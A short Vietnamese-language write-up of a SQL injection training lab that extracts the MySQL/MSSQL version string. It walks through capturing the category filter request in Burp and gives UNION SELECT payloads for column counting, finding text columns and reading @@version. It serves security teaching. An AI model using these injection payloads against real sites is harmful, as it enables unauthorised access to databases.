# SQL Injection Lab 04: Database Version (MySQL/MSSQL)

## Mục tiêu
Khai thác SQLi để lấy chuỗi version của MySQL hoặc Microsoft SQL Server.

<img src="images/04_mysql-mssql-version-2026-04-14-20-42-55.png" alt="Lab overview" width="760" />
<br><br>

## Các bước chính
1. Bắt request `/filter?category=...` bằng Burp Repeater.

<img src="images/04_mysql-mssql-version-2026-04-14-20-41-34.png" alt="Captured request" width="760" />
<br><br>

2. Dò số cột với `UNION SELECT`:

```sql
' union select null, null#
```

<img src="images/04_mysql-mssql-version-2026-04-14-20-47-42.png" alt="Find column count" width="760" />
<br><br>

3. Dò cột hiển thị text:

```sql
' union select 'abc','def'#
```

4. Lấy version DB:

```sql
' union select @@version, null#
```

<img src="images/04_mysql-mssql-version-2026-04-14-20-53-04.png" alt="Result" width="760" />
<br><br>

## Payload solve

```sql
' union select @@version, null#
```
